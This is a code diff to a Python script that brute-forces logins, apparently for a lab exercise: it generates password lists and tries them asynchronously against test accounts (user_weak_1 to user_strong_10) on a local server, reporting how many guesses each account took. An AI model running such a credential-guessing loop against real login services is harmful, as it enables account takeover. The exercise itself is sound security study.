@@ -1,7 +1,8 @@
 from client import LoginClient
 import secrets
 import string
-
+import aiohttp
+import asyncio
 
 group_seed = 413134
 #base_url = 'http://192.168.1.103:5000'
@@ -47,35 +48,38 @@ def build_password_map(med_amount = 20000, strong_amount=20000):
     return passwords
 
 
-def iterate_over_user(username, passwords):
+async def iterate_over_user(username, passwords):
     counter = 0
-    client = LoginClient(base_url, group_seed)
+    async with aiohttp.ClientSession() as session:
+        client = LoginClient(session, base_url, group_seed)
 
-    for password in passwords:
-        if client.attempt_login_once(username, password):
-            print(f"{username}, {password}, Broke after {counter} iterations")
-            return True
-        else:
-            #print(f"{username}, {password}, Fail!")
-            counter = counter + 1
-    return False
+        for password in passwords:
+            if await client.attempt_login_once(username, password):
+                print(f"{username}, {password}, Broke after {counter} iterations")
+                return True
+            else:
+                #print(f"{username}, {password}, Fail!")
+                counter = counter + 1
+        return False
+
+async def main():
+    passwords = build_password_map()
+
+    for i in range(1, 30+1, 1):
+        level = int(i / 10)
+        if level == 0:
+            state = 'weak'
+        elif level == 1:
+            state = 'medium'
+        elif level == 2:
+            state = 'strong'
+
+        idx = i % 10 if i % 10 != 0 else 10
+        username = f'user_{state}_{idx}'
 
 
-passwords = build_password_map()
+        print(f"iterating over {username}...")
+        await iterate_over_user(username, passwords)
 
-for i in range(1, 30+1, 1):
-    level = int(i / 10)
-    if level == 0:
-        state = 'weak'
-    elif level == 1:
-        state = 'medium'
-    elif level == 2:
-        state = 'strong'
-    
-    idx = i % 10 if i % 10 != 0 else 10
-    username = f'user_{state}_{idx}'
-
-    
-    print(f"iterating over {username}...")
-    iterate_over_user(username, passwords)
-
+if __name__ == "__main__":
+    asyncio.run(main())
